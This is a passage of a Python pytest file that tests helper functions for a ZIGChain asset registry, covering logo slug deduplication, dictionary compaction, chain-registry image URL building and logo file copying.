        asset_id="zigchain",
        base_denom="uzig",
        symbol="ZIG",   # slugifies to "zig" — duplicate of display_denom
        name="ZIGChain",
        decimals=6,
        display_denom="zig",
        denom_units=[DenomUnit(denom="uzig", exponent=0), DenomUnit(denom="zig", exponent=6)],
    )
    result = _asset_logo_slugs(asset)
    assert result == ["zigchain", "zig"]  # "zig" appears once, not twice


def test_asset_logo_slugs_all_distinct_sources_in_order() -> None:
    """All four sources (declared, asset_id, display_denom, symbol) appear in priority order."""

    asset = SimpleNamespace(
        logo_uris=SimpleNamespace(png="https://cdn.example.com/special.png", svg=None),
        asset_id="zigchain",
        display_denom="Zig",
        symbol="ZG",
    )
    result = _asset_logo_slugs(asset)
    assert result == ["special", "zigchain", "zig", "zg"]


def test_asset_logo_slugs_no_attributes_returns_empty_list() -> None:
    """Asset with no relevant attributes produces an empty slug list."""

    asset = SimpleNamespace()  # no logo_uris, asset_id, display_denom, or symbol
    result = _asset_logo_slugs(asset)
    assert result == []


def test_asset_logo_slugs_slugify_applied_during_dedup() -> None:
    """Different-case spellings of the same name deduplicate to a single lowercase slug."""

    asset = SimpleNamespace(
        logo_uris=None,
        asset_id="atom",    # stays "atom"
        display_denom="ATOM",  # slugifies to "atom" — duplicate
        symbol="Atom",         # slugifies to "atom" — duplicate
    )
    result = _asset_logo_slugs(asset)
    assert result == ["atom"]


def test_asset_logo_slugs_colon_in_display_denom_is_stripped() -> None:
    """Colons in display_denom (e.g. IBC-style denoms) are stripped by slugify."""

    asset = SimpleNamespace(
        logo_uris=None,
        asset_id="zig",
        display_denom="ibc:uusdc",  # colon stripped → "ibcuusdc"
        symbol="USDC",
    )
    result = _asset_logo_slugs(asset)
    assert result == ["zig", "ibcuusdc", "usdc"]



######################################################################
# Tests for _compact_dict
######################################################################


@pytest.mark.parametrize(
    "key, value",
    [
        ("a", None),        # None removed
        ("b", []),          # empty list removed
        ("c", {}),          # empty dict removed
    ],
)
def test_compact_dict_removes_each_empty_value_individually(key: str, value: object) -> None:
    """Each stripped value type (None, [], {}) is removed on its own."""

    result = _compact_dict({key: value})
    assert result == {}


def test_compact_dict_removes_none_and_empty_collections() -> None:
    """_compact_dict drops all three empty-value types in one pass, keeps non-empty values."""

    d = {"a": 1, "b": None, "c": [], "d": {}, "e": "ok"}
    result = _compact_dict(d)
    assert result == {"a": 1, "e": "ok"}


def test_compact_dict_all_values_stripped_returns_empty() -> None:
    """Dict where every value is None, [], or {} produces an empty output dict."""

    d = {"x": None, "y": [], "z": {}}
    assert _compact_dict(d) == {}


def test_compact_dict_nonempty_nested_structures_are_kept() -> None:
    """Non-empty nested dicts and lists must not be removed."""

    d = {"traces": [{"type": "ibc-cw20"}], "meta": {"chain": "zigchain"}}
    result = _compact_dict(d)
    assert result == {"traces": [{"type": "ibc-cw20"}], "meta": {"chain": "zigchain"}}


def test_compact_dict_does_not_mutate_input() -> None:
    """_compact_dict must not modify the original dict."""

    original = {"keep": "yes", "drop": None}
    original_copy = dict(original)
    _compact_dict(original)
    assert original == original_copy


def test_compact_dict_realistic_asset_dict() -> None:
    """Simulates the asset serialization use case: optional empty fields are stripped."""

    # This mirrors what model_dump() produces for an asset with sparse optional fields
    asset_dict = {
        "asset_id": "zigchain",
        "base_denom": "uzig",
        "display_denom": "zig",
        "symbol": "ZIG",
        "decimals": 6,
        "logo_uris": None,     # not set
        "traces": [],          # no IBC traces
        "coingecko_id": None,  # not listed on CoinGecko
        "images": {},          # no images dict
    }
    result = _compact_dict(asset_dict)
    assert result == {
        "asset_id": "zigchain",
        "base_denom": "uzig",
        "display_denom": "zig",
        "symbol": "ZIG",
        "decimals": 6,
    }


def test_compact_dict_empty_dict_returns_empty() -> None:
    """_compact_dict on empty dict returns empty dict."""

    assert _compact_dict({}) == {}


def test_compact_dict_keeps_false_and_zero_values() -> None:
    """_compact_dict must NOT remove falsy values that are not None/{}/[]: False, 0, empty string."""

    d = {"flag": False, "count": 0, "label": ""}
    result = _compact_dict(d)
    assert result["flag"] is False
    assert result["count"] == 0
    assert result["label"] == ""



######################################################################
# Tests for _declared_logo_uris_dict
######################################################################


def test_declared_logo_uris_dict_returns_png_svg_when_both_set_as_dict() -> None:
    """logo_uris is a plain dict with both png and svg → both appear in output."""

    asset = SimpleNamespace(logo_uris={"png": "https://ex.com/a.png", "svg": "https://ex.com/a.svg"})
    result = _declared_logo_uris_dict(asset)
    assert result is not None
    assert result["png"] == "https://ex.com/a.png"
    assert result["svg"] == "https://ex.com/a.svg"


def test_declared_logo_uris_dict_dict_png_only_svg_none_excluded() -> None:
    """Dict with svg=None — None is filtered out at, only png appears in output."""

    asset = SimpleNamespace(logo_uris={"png": "https://ex.com/a.png", "svg": None})
    result = _declared_logo_uris_dict(asset)
    assert result is not None
    assert result == {"png": "https://ex.com/a.png"}
    assert "svg" not in result


def test_declared_logo_uris_dict_dict_svg_only_png_none_excluded() -> None:
    """Dict with png=None — None is filtered out3, only svg appears in output."""

    asset = SimpleNamespace(logo_uris={"png": None, "svg": "https://ex.com/a.svg"})
    result = _declared_logo_uris_dict(asset)
    assert result is not None
    assert result == {"svg": "https://ex.com/a.svg"}
    assert "png" not in result


def test_declared_logo_uris_dict_dict_no_png_svg_keys_returns_none() -> None:
    """Dict with no 'png' or 'svg' keys — out is empty so 'out or None' returns None."""

    # chain_name is a valid LogoUris field but the output loop only checks png/svg
    asset = SimpleNamespace(logo_uris={"chain_name": "cosmoshub"})
    assert _declared_logo_uris_dict(asset) is None


def test_declared_logo_uris_dict_pydantic_model_png_only() -> None:
    """LogoUris Pydantic model with only png set — uses model_dump path, returns png string."""

    logo = LogoUris(png="https://raw.githubusercontent.com/test/a.png")
    asset = SimpleNamespace(logo_uris=logo)
    result = _declared_logo_uris_dict(asset)
    assert result is not None
    assert "png" in result
    assert result["png"].endswith("a.png")  # Pydantic HttpUrl may add trailing slash
    assert "svg" not in result


def test_declared_logo_uris_dict_pydantic_model_both_png_and_svg() -> None:
    """LogoUris Pydantic model with both png and svg — model_dump path returns both as strings."""

    logo = LogoUris(
        png="https://raw.githubusercontent.com/test/a.png",
        svg="https://raw.githubusercontent.com/test/a.svg",
    )
    asset = SimpleNamespace(logo_uris=logo)
    result = _declared_logo_uris_dict(asset)
    assert result is not None
    assert "png" in result
    assert "svg" in result
    assert result["png"].endswith("a.png")
    assert result["svg"].endswith("a.svg")


def test_declared_logo_uris_dict_pydantic_model_chain_name_only_returns_none() -> None:
    """LogoUris with only chain_name set — model_dump produces no png/svg keys, returns None."""

    logo = LogoUris(chain_name="cosmoshub")
    asset = SimpleNamespace(logo_uris=logo)
    # model_dump(exclude_none=True) gives {"chain_name": "cosmoshub"} — no png or svg
    assert _declared_logo_uris_dict(asset) is None


def test_declared_logo_uris_dict_logo_uris_none_explicit_returns_none() -> None:
    """logo_uris attribute exists but is explicitly None — hits the 'if declared is None' guard."""

    asset = SimpleNamespace(logo_uris=None)
    assert _declared_logo_uris_dict(asset) is None


def test_declared_logo_uris_dict_no_logo_uris_attribute_returns_none() -> None:
    """Asset has no logo_uris attribute at all — getattr returns None, returns None."""

    asset = SimpleNamespace(asset_id="zigchain")
    assert _declared_logo_uris_dict(asset) is None


def test_declared_logo_uris_dict_dict_empty_string_png_is_skipped() -> None:
    """Dict with png='' — empty string is falsy so 'd[k]' check skips it, returns None."""

    asset = SimpleNamespace(logo_uris={"png": "", "svg": ""})
    assert _declared_logo_uris_dict(asset) is None


######################################################################
# Tests for _is_our_assets_repo_raw
######################################################################

def test_is_our_assets_repo_raw_true_for_zigchain_raw_url() -> None:
    """_is_our_assets_repo_raw returns True for ZIGChain zigchain-registry raw URL."""

    url = "https://raw.githubusercontent.com/ZIGChain/zigchain-registry/main/logos/zig.png"
    assert _is_our_assets_repo_raw(url) is True


def test_is_our_assets_repo_raw_false_for_other_url() -> None:
    """_is_our_assets_repo_raw returns False for non-ZIGChain URL."""

    assert _is_our_assets_repo_raw("https://example.com/logo.png") is False
    assert _is_our_assets_repo_raw("") is False


def test_is_our_assets_repo_raw_false_for_none_input() -> None:
    """None input is handled by the 'url or ""' guard and returns False."""

    assert _is_our_assets_repo_raw(None) is False  # type: ignore[arg-type]


def test_is_our_assets_repo_raw_false_for_other_zigchain_repo() -> None:
    """Match requires the trailing slash — look-alikes like `zigchain-registry-old` are not ours."""

    url = "https://raw.githubusercontent.com/ZIGChain/zigchain-registry-old/main/logos/zig.png"
    assert _is_our_assets_repo_raw(url) is False


def test_is_our_assets_repo_raw_false_for_lowercase_org_name() -> None:
    """Match is case-sensitive — lowercase 'zigchain' instead of 'ZIGChain' returns False."""

    url = "https://raw.githubusercontent.com/zigchain/zigchain-registry/main/logos/zig.png"
    assert _is_our_assets_repo_raw(url) is False


######################################################################
# Tests for _should_preserve_declared_logo_uris
######################################################################


def test_should_preserve_declared_logo_uris_true_when_not_our_repo(full_ibc_asset: IBCAsset) -> None:
    """When logo_uris points to external URL (cosmos/chain-registry), preserve is True."""

    # full_ibc_asset has logo_uris.png/svg pointing to cosmos/chain-registry — not our repo
    assert _should_preserve_declared_logo_uris(full_ibc_asset) is True




def test_should_preserve_declared_logo_uris_false_when_our_repo() -> None:
    """When logo_uris points to our assets repo raw URL, preserve is False (allow rewriting)."""

    url = "https://raw.githubusercontent.com/ZIGChain/zigchain-registry/main/logos/zig.png"
    asset = SimpleNamespace(logo_uris={"png": url, "svg": None})
    assert _should_preserve_declared_logo_uris(asset) is False


def test_should_preserve_declared_logo_uris_false_when_no_logo_uris(
    valid_native_asset_payload: dict,
) -> None:
    """NativeAsset with no logo_uris — _declared_logo_uris_dict returns None, returns False."""

    asset = NativeAsset(**valid_native_asset_payload)
    assert _should_preserve_declared_logo_uris(asset) is False


def test_should_preserve_declared_logo_uris_false_when_logo_uris_none() -> None:
    """logo_uris=None explicitly — same as missing, 'if not d' returns False."""

    asset = SimpleNamespace(logo_uris=None)
    assert _should_preserve_declared_logo_uris(asset) is False


def test_should_preserve_declared_logo_uris_false_when_mixed_our_and_external() -> None:
    """One URL is our repo, one is external — any() finds our repo URL so returns False."""

    our_url = "https://raw.githubusercontent.com/ZIGChain/zigchain-registry/main/logos/zig.png"
    external_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/ethereum/images/eth.svg"
    asset = SimpleNamespace(logo_uris={"png": our_url, "svg": external_url})
    assert _should_preserve_declared_logo_uris(asset) is False


######################################################################
# Tests for _chain_registry_images_base_url
######################################################################

# ----------------
# Positive tests for _chain_registry_images_base_url
# ----------------


def test_chain_registry_images_base_url_cosmos_chain_exact_url() -> None:
    """Cosmos chain produces the exact expected GitHub raw URL with chain name and /images suffix."""

    result = _chain_registry_images_base_url(chain_name="zigchain")
    assert result == "https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images"


def test_chain_registry_images_base_url_cosmos_chain_no_non_cosmos_prefix() -> None:
    """Cosmos chain URL must not include the _non-cosmos path segment."""

    result = _chain_registry_images_base_url(chain_name="noble")
    assert "_non-cosmos" not in result
    assert result.endswith("noble/images")


def test_chain_registry_images_base_url_ethereum_exact_url() -> None:
    """Ethereum produces the exact expected GitHub raw URL under _non-cosmos."""

    result = _chain_registry_images_base_url(chain_name="ethereum")
    assert result == "https://raw.githubusercontent.com/cosmos/chain-registry/master/_non-cosmos/ethereum/images"


def test_chain_registry_images_base_url_strips_whitespace_cosmos() -> None:
    """Leading/trailing whitespace in chain_name is stripped before building the cosmos URL."""

    result = _chain_registry_images_base_url(chain_name="  noble  ")
    assert result == "https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images"


def test_chain_registry_images_base_url_strips_whitespace_non_cosmos() -> None:
    """Whitespace around 'ethereum' is stripped before the _NON_COSMOS_CHAIN_NAMES lookup."""

    result = _chain_registry_images_base_url(chain_name="  ethereum  ")
    assert result == "https://raw.githubusercontent.com/cosmos/chain-registry/master/_non-cosmos/ethereum/images"



######################################################################
# Tests for _ibc_logo_chain_name
######################################################################


def test_ibc_logo_chain_name_returns_chain_name_when_set() -> None:
    """logo_uris.chain_name is a plain string — returns it as-is."""

    asset = SimpleNamespace(logo_uris=SimpleNamespace(chain_name="noble"))
    assert _ibc_logo_chain_name(asset) == "noble"


def test_ibc_logo_chain_name_with_real_pydantic_model(full_ibc_asset: IBCAsset) -> None:
    """LogoUris Pydantic model with chain_name='noble' — returns 'noble' via model_dump path."""

    # full_ibc_asset has logo_uris=LogoUris(chain_name="noble", ...)
    assert _ibc_logo_chain_name(full_ibc_asset) == "noble"


def test_ibc_logo_chain_name_strips_whitespace_from_chain_name() -> None:
    """Whitespace-padded chain_name is stripped before being returned."""

    # LogoUris.chain_name has min_length=1, so "  noble  " (length 8) passes validation.
    # _ibc_logo_chain_name strips it at both line 312 and 313.
    logo = LogoUris(chain_name="  noble  ")
    asset = SimpleNamespace(logo_uris=logo)
    assert _ibc_logo_chain_name(asset) == "noble"


def test_ibc_logo_chain_name_logo_uris_none_returns_none(
    valid_native_asset_payload: dict,
) -> None:
    """NativeAsset with no logo_uris set — logo_uris defaults to None, returns None."""

    asset = NativeAsset(**valid_native_asset_payload)  # logo_uris defaults to None
    assert _ibc_logo_chain_name(asset) is None


def test_ibc_logo_chain_name_no_logo_uris_attribute_returns_none() -> None:
    """Asset with no logo_uris attribute at all — getattr returns None, returns None."""

    asset = SimpleNamespace(asset_id="zigchain")
    assert _ibc_logo_chain_name(asset) is None


def test_ibc_logo_chain_name_chain_name_is_none_returns_none() -> None:
    """logo_uris exists but chain_name is None — isinstance(None, str) is False, returns None."""

    # LogoUris with only png set: chain_name defaults to None
    logo = LogoUris(png="https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images/usdc.png")
    asset = SimpleNamespace(logo_uris=logo)
    assert _ibc_logo_chain_name(asset) is None


def test_ibc_logo_chain_name_whitespace_only_chain_name_returns_none() -> None:
    """Whitespace-only chain_name passes min_length=1 but cn.strip() is falsy — returns None."""

    # "  " has length 2 so passes LogoUris validation, but strips to "" which is falsy
    logo = LogoUris(chain_name="  ")
    asset = SimpleNamespace(logo_uris=logo)
    assert _ibc_logo_chain_name(asset) is None



######################################################################
# Tests for _basename_from_uri
######################################################################


def test_basename_from_uri_returns_png_filename() -> None:
    """_basename_from_uri returns the last path segment for a PNG URL."""

    assert _basename_from_uri("https://example.com/path/to/logo.png") == "logo.png"


def test_basename_from_uri_returns_svg_filename() -> None:
    """_basename_from_uri returns the last path segment for an SVG URL."""

    assert _basename_from_uri("https://example.com/path/to/logo.svg") == "logo.svg"


def test_basename_from_uri_real_chain_registry_url(full_ibc_asset: IBCAsset) -> None:
    """_basename_from_uri extracts the filename from an actual cosmos/chain-registry URL."""

    # full_ibc_asset.logo_uris.png is the real URL format the function receives in production
    png_url = str(full_ibc_asset.logo_uris.png)
    result = _basename_from_uri(png_url)
    assert result == "USDCoin.png"


def test_basename_from_uri_none_returns_none() -> None:
    """_basename_from_uri(None) hits the except branch and returns None without crashing."""

    result = _basename_from_uri(None)  # type: ignore[arg-type]
    assert result is None


def test_basename_from_uri_trailing_slash_returns_none() -> None:
    """URL ending in '/' has no filename — Path('/').name is '' — returns None."""

    assert _basename_from_uri("https://example.com/") is None


def test_basename_from_uri_no_path_returns_none() -> None:
    """URL with no path at all — urlparse().path is '' — Path('').name is '' — returns None."""

    assert _basename_from_uri("https://example.com") is None



######################################################################
# Tests for _ibc_logo_uris_from_chain_name
######################################################################


# ----------------
# Positive tests for _ibc_logo_uris_from_chain_name
# ----------------


def test_ibc_logo_uris_from_chain_name_returns_both_png_and_svg(full_ibc_asset: IBCAsset) -> None:
    """Both png and svg are rewritten to chain-registry URLs under the declared chain folder."""

    # full_ibc_asset has logo_uris.chain_name="noble", png and svg both set
    result = _ibc_logo_uris_from_chain_name(full_ibc_asset)

    assert "png" in result
    assert "svg" in result
    assert result["png"] == "https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images/USDCoin.png"
    assert "noble" in result["svg"]
    assert result["svg"].endswith("USDCoin.svg")


def test_ibc_logo_uris_from_chain_name_returns_none_when_no_chain_name(
    valid_ibc_asset_payload: dict,
) -> None:
    """IBCAsset with no logo_uris — chain_name is absent, returns None."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    assert _ibc_logo_uris_from_chain_name(asset) is None


def test_ibc_logo_uris_from_chain_name_returns_none_when_chain_name_set_but_no_png_svg() -> None:
    """LogoUris with only chain_name — model_dump produces no png/svg, declared is None, returns None."""

    # LogoUris(chain_name="noble") goes through model_dump(exclude_none=True) →
    # {"chain_name": "noble"} → no png/svg keys → _declared_logo_uris_dict returns None
    asset = SimpleNamespace(logo_uris=LogoUris(chain_name="noble"))
    assert _ibc_logo_uris_from_chain_name(asset) is None


def test_ibc_logo_uris_from_chain_name_returns_none_when_basename_extraction_fails() -> None:
    """When declared png URL has no filename, _basename_from_uri returns None and out stays empty."""

    # Bare-host URL is a valid HttpUrl but has no filename — basename returns None
    # With no svg either, out is empty → 'out or None' returns None
    asset = SimpleNamespace(
        logo_uris=LogoUris(
            chain_name="noble",
            png="https://raw.githubusercontent.com/",
        ),
    )
    result = _ibc_logo_uris_from_chain_name(asset)
    assert result is None



######################################################################
# Tests for _ibc_images_base_url_override
######################################################################


def test_ibc_images_base_url_override_returns_base_url_for_declared_chain(
    full_ibc_asset: IBCAsset,
) -> None:
    """Returns the chain-registry images base URL for the chain declared in logo_uris.chain_name.

    full_ibc_asset has logo_uris.chain_name='noble', so the function returns the noble/images
    base URL. Callers use this return value to override their default base URL when building
    image paths.
    """

    result = _ibc_images_base_url_override(full_ibc_asset)
    assert result == "https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images"


def test_ibc_images_base_url_override_exact_url_for_cosmos_chain() -> None:
    """Returns the exact cosmos/chain-registry images URL for a regular cosmos chain."""

    asset = SimpleNamespace(logo_uris=LogoUris(chain_name="cosmoshub"))
    result = _ibc_images_base_url_override(asset)
    assert result == "https://raw.githubusercontent.com/cosmos/chain-registry/master/cosmoshub/images"


def test_ibc_images_base_url_override_non_cosmos_chain_uses_non_cosmos_prefix() -> None:
    """chain_name='ethereum' produces a _non-cosmos prefixed URL."""

    asset = SimpleNamespace(logo_uris=LogoUris(chain_name="ethereum"))
    result = _ibc_images_base_url_override(asset)
    assert result == "https://raw.githubusercontent.com/cosmos/chain-registry/master/_non-cosmos/ethereum/images"


def test_ibc_images_base_url_override_returns_none_when_no_chain_name(
    valid_ibc_asset_payload: dict,
) -> None:
    """IBCAsset with no logo_uris — chain_name absent, returns None."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    assert _ibc_images_base_url_override(asset) is None


######################################################################
# Tests for _ibc_computed_images_from_declared_basenames
######################################################################


def test_ibc_computed_images_from_declared_basenames_png_only() -> None:
    """Only png declared — extracts png basename, svg is None."""

    asset = SimpleNamespace(
        logo_uris=LogoUris(
            chain_name="noble",
            png="https://raw.githubusercontent.com/test/logos/usdc.png",
        ),
    )
    result = _ibc_computed_images_from_declared_basenames(asset)
    assert isinstance(result, AssetImages)
    assert result.png == "usdc.png"
    assert result.svg is None


def test_ibc_computed_images_from_declared_basenames_svg_only() -> None:
    """Only svg declared — svg basename extracted, png is None."""

    asset = SimpleNamespace(
        logo_uris=LogoUris(
            chain_name="noble",
            svg="https://raw.githubusercontent.com/test/logos/usdc.svg",
        ),
    )
    result = _ibc_computed_images_from_declared_basenames(asset)
    assert result.png is None
    assert result.svg == "usdc.svg"


def test_ibc_computed_images_from_declared_basenames_both_png_and_svg(
    full_ibc_asset: IBCAsset,
) -> None:
    """Both png and svg declared — extracts both basenames from real chain-registry URLs."""

    # full_ibc_asset has logo_uris.png/svg pointing to noble/images/USDCoin.png/.svg
    result = _ibc_computed_images_from_declared_basenames(full_ibc_asset)
    assert result.png == "USDCoin.png"
    assert result.svg == "USDCoin.svg"


def test_ibc_computed_images_from_declared_basenames_no_logo_uris(
    valid_ibc_asset_payload: dict,
) -> None:
    """IBCAsset with no logo_uris — declared is None, or {} fallback, returns AssetImages(None, None)."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    result = _ibc_computed_images_from_declared_basenames(asset)
    assert isinstance(result, AssetImages)
    assert result.png is None
    assert result.svg is None


######################################################################
# Tests for _logo_uris_for_output
######################################################################


def test_logo_uris_for_output_returns_computed_png_and_svg() -> None:
    """Both png and svg computed — returns both canonical chain-registry URLs."""

    asset = SimpleNamespace(logo_uris=None, images=None)
    computed = AssetImages(png="zig.png", svg="zig.svg")
    local_base_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images"
    result = _logo_uris_for_output(asset=asset, computed=computed, local_base_url=local_base_url)
    assert result is not None
    assert result["png"] == f"{local_base_url}/zig.png"
    assert result["svg"] == f"{local_base_url}/zig.svg"


def test_logo_uris_for_output_preserves_declared_external_when_no_computed(
    full_ibc_asset: IBCAsset,
) -> None:
    """External declared logo_uris (cosmos/chain-registry) is preserved when no computed images."""

    # full_ibc_asset.logo_uris points to noble/images — external, not our repo → preserve it
    computed = AssetImages(png=None, svg=None)
    result = _logo_uris_for_output(
        asset=full_ibc_asset,
        computed=computed,
        local_base_url="https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images",
    )
    assert result is not None
    assert result["png"].endswith("USDCoin.png")
    assert result["svg"].endswith("USDCoin.svg")


def test_logo_uris_for_output_declared_external_wins_over_computed(
    full_ibc_asset: IBCAsset,
) -> None:
    """External declared logo_uris takes priority over computed images — line 377 fires first."""

    # computed uses a deliberately different filename so it's unambiguous which URL won
    computed = AssetImages(png="local-override.png", svg="local-override.svg")
    local_base_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images"
    result = _logo_uris_for_output(
        asset=full_ibc_asset,
        computed=computed,
        local_base_url=local_base_url,
    )
    # Must return the declared noble/images URL, not the computed zigchain/local-override URL
    assert result is not None
    assert "local-override" not in result["png"]  # computed filename must not appear
    assert result["png"].endswith("USDCoin.png")  # declared filename wins
    assert "noble" in result["png"]               # declared chain (noble), not zigchain


def test_logo_uris_for_output_falls_back_to_our_repo_url_when_no_computed() -> None:
    """Declared URL pointing to our own repo is returned when computed images are absent."""

    # Our repo URL → _should_preserve_declared_logo_uris returns False
    # computed is empty → computed_logo is None
    # Falls through to return declared_dict or None → returns declared_dict
    our_url = "https://raw.githubusercontent.com/ZIGChain/zigchain-registry/main/logos/zig.png"
    asset = SimpleNamespace(logo_uris={"png": our_url})
    computed = AssetImages(png=None, svg=None)
    result = _logo_uris_for_output(
        asset=asset,
        computed=computed,
        local_base_url="https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images",
    )
    assert result is not None
    assert result["png"] == our_url


def test_logo_uris_for_output_returns_none_when_nothing_available(
    valid_ibc_asset_payload: dict,
) -> None:
    """IBCAsset with no logo_uris and no computed images — returns None."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    computed = AssetImages(png=None, svg=None)
    result = _logo_uris_for_output(
        asset=asset,
        computed=computed,
        local_base_url="https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images",
    )
    assert result is None

######################################################################
# Tests for _images_for_output
######################################################################


def test_images_for_output_computed_png_only() -> None:
    """No declared images — computed png produces an exact canonical chain-registry URL."""

    asset = SimpleNamespace(logo_uris=None, images=None)
    computed = AssetImages(png="zig.png", svg=None)
    local_base_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images"
    result = _images_for_output(
        asset=asset,
        computed=computed,
        local_base_url=local_base_url,
        logo_uris_out=None,
    )
    assert isinstance(result, list)
    assert len(result) == 1
    assert result[0]["png"] == f"{local_base_url}/zig.png"
    assert "svg" not in result[0]


def test_images_for_output_computed_both_png_and_svg() -> None:
    """No declared images — both computed png and svg appear in the output entry."""

    asset = SimpleNamespace(logo_uris=None, images=None)
    computed = AssetImages(png="zig.png", svg="zig.svg")
    local_base_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images"
    result = _images_for_output(
        asset=asset,
        computed=computed,
        local_base_url=local_base_url,
        logo_uris_out=None,
    )
    assert isinstance(result, list)
    assert result[0]["png"] == f"{local_base_url}/zig.png"
    assert result[0]["svg"] == f"{local_base_url}/zig.svg"


def test_images_for_output_uses_declared_images_when_set(full_ibc_asset: IBCAsset) -> None:
    """Declared images on the asset are merged with computed — declared path fires first."""

    # full_ibc_asset.images = [{"chain_name": "noble", "base_denom": "uusdc"}] (shortcut form)
    computed = AssetImages(png="USDCoin.png", svg="USDCoin.svg")
    local_base_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images"
    result = _images_for_output(
        asset=full_ibc_asset,
        computed=computed,
        local_base_url=local_base_url,
        logo_uris_out=None,
    )
    assert isinstance(result, list)
    assert len(result) == 1
    # Shortcut form expands to image_sync + computed urls
    assert result[0]["image_sync"] == {"chain_name": "noble", "base_denom": "uusdc"}
    assert result[0]["png"] == f"{local_base_url}/USDCoin.png"
    assert result[0]["svg"] == f"{local_base_url}/USDCoin.svg"


def test_images_for_output_declared_images_wins_over_logo_uris_out(
    full_ibc_asset: IBCAsset,
) -> None:
    """Declared images take priority — logo_uris_out is not used when images are declared."""

    computed = AssetImages(png="USDCoin.png", svg=None)
    local_base_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images"
    logo_uris_out = {"png": "https://should-not-appear.example.com/logo.png"}
    result = _images_for_output(
        asset=full_ibc_asset,
        computed=computed,
        local_base_url=local_base_url,
        logo_uris_out=logo_uris_out,
    )
    assert result == [
        {
            "image_sync": {"chain_name": "noble", "base_denom": "uusdc"},
            "png": "https://raw.githubusercontent.com/cosmos/chain-registry/master/noble/images/USDCoin.png",
        }
    ]


def test_images_for_output_empty_declared_images_list_falls_through_to_computed() -> None:
    """images=[] is falsy — skips declared path and falls through to computed."""

    asset = SimpleNamespace(logo_uris=None, images=[])
    computed = AssetImages(png="zig.png", svg=None)
    local_base_url = "https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images"
    result = _images_for_output(
        asset=asset,
        computed=computed,
        local_base_url=local_base_url,
        logo_uris_out=None,
    )
    assert isinstance(result, list)
    assert result[0]["png"] == f"{local_base_url}/zig.png"


def test_images_for_output_mirrors_logo_uris_when_no_computed() -> None:
    """No declared images and no computed — logo_uris_out is mirrored into the images list."""

    asset = SimpleNamespace(logo_uris=None, images=None)
    computed = AssetImages(png=None, svg=None)
    logo_uris_out = {"png": "https://example.com/logos/token.png"}
    result = _images_for_output(
        asset=asset,
        computed=computed,
        local_base_url="https://example.com/images",
        logo_uris_out=logo_uris_out,
    )
    assert isinstance(result, list)
    assert len(result) == 1
    assert result[0]["png"] == "https://example.com/logos/token.png"


def test_images_for_output_returns_none_when_all_empty(
    valid_ibc_asset_payload: dict,
) -> None:
    """IBCAsset with no images, no computed, no logo_uris_out — returns None."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    result = _images_for_output(
        asset=asset,
        computed=AssetImages(png=None, svg=None),
        local_base_url="https://raw.githubusercontent.com/cosmos/chain-registry/master/zigchain/images",
        logo_uris_out=None,
    )
    assert result is None


######################################################################
# Tests for copy_images
######################################################################


def test_copy_images_copies_png_and_content_is_preserved(tmp_path: Path) -> None:
    """copy_images copies the file and preserves its content exactly."""

    logos = tmp_path / "logos"
    logos.mkdir()
    (logos / "zig.png").write_text("png-content", encoding="utf-8")
    dest = tmp_path / "out" / "images"  # not pre-created — mkdir must handle it
    images = AssetImages(png="zig.png", svg=None)

    count = copy_images(images, logos, dest)

    assert count == 1
    assert (dest / "zig.png").exists()
    assert (dest / "zig.png").read_text(encoding="utf-8") == "png-content"


def test_copy_images_copies_both_png_and_svg(tmp_path: Path) -> None:
    """copy_images copies both png and svg when both exist — returns count of 2."""

    logos = tmp_path / "logos"
    logos.mkdir()
    (logos / "zig.png").write_text("png", encoding="utf-8")
    (logos / "zig.svg").write_text("svg", encoding="utf-8")
    dest = tmp_path / "out" / "images"

    count = copy_images(AssetImages(png="zig.png", svg="zig.svg"), logos, dest)

    assert count == 2
    assert (dest / "zig.png").exists()
    assert (dest / "zig.svg").exists()


def test_copy_images_none_filenames_copies_nothing(tmp_path: Path) -> None:
    """AssetImages with both png and svg as None — nothing to copy, returns 0."""

    logos = tmp_path / "logos"
    logos.mkdir()
    dest = tmp_path / "out"
    dest.mkdir()

    count = copy_images(AssetImages(png=None, svg=None), logos, dest)

    assert count == 0


def test_copy_images_source_file_missing_skipped_silently(tmp_path: Path) -> None:
    """When the source file does not exist in logos_dir, it is silently skipped — count stays 0."""

    logos = tmp_path / "logos"
    logos.mkdir()
    # no file written — logos_dir is empty
    dest = tmp_path / "out" / "images"

    count = copy_images(AssetImages(png="missing.png", svg=None), logos, dest)

    assert count == 0
    assert not (dest / "missing.png").exists()


def test_copy_images_only_existing_file_copied_when_one_missing(tmp_path: Path) -> None:
    """When png exists but svg is missing on disk, only png is copied — count is 1."""

    logos = tmp_path / "logos"
    logos.mkdir()
    (logos / "zig.png").write_text("png", encoding="utf-8")
    # zig.svg intentionally not created
    dest = tmp_path / "out" / "images"

    count = copy_images(AssetImages(png="zig.png", svg="zig.svg"), logos, dest)

    assert count == 1
    assert (dest / "zig.png").exists()
    assert not (dest / "zig.svg").exists()


def test_copy_images_skips_already_copied_filename(tmp_path: Path) -> None:
    """Files already in the shared copied set are skipped — second call returns 0."""

    logos = tmp_path / "logos"
    logos.mkdir()
    (logos / "zig.png").write_text("original", encoding="utf-8")
    dest = tmp_path / "out" / "images"

    images = AssetImages(png="zig.png", svg=None)
    copied: set[str] = set()

    count1 = copy_images(images, logos, dest, copied=copied)
    assert count1 == 1
    assert "zig.png" in copied

    count2 = copy_images(images, logos, dest, copied=copied)
    assert count2 == 0


######################################################################
# Tests for _supplemental_traces_for_output
######################################################################


